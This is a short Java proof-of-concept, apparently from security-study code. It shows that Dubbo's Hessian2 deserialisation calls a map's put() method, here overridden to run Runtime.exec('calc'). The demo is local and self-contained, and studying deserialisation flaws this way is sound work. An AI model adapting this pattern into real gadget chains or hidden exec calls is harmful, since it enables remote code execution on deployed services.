package com.example.javasec.hessian2;

import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput;
import java.io.*;
import java.util.HashMap;

public class Hessian2Gadget {
    public static class MyHashMap<K, V> extends HashMap<K, V> {

        public V put(K key, V value) {
            super.put(key, value);
            System.out.println(111111111);
            try {
                Runtime.getRuntime().exec("calc");
            } catch (Exception e) {
            }
            System.out.println(22222222);
            return null;
        }
    }

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        MyHashMap map = new MyHashMap();
        map.put("1", "1");

        // hessian2的序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput hessian2Output = new Hessian2ObjectOutput(byteArrayOutputStream);
        hessian2Output.writeObject(map);
        hessian2Output.flushBuffer();
        byte[] bytes = byteArrayOutputStream.toByteArray();

        System.out.println(new String(bytes, 0, bytes.length));
        // hessian2的反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        Hessian2ObjectInput hessian2Input = new Hessian2ObjectInput(byteArrayInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();
        o.get(null);
        System.out.println(o);
    }
}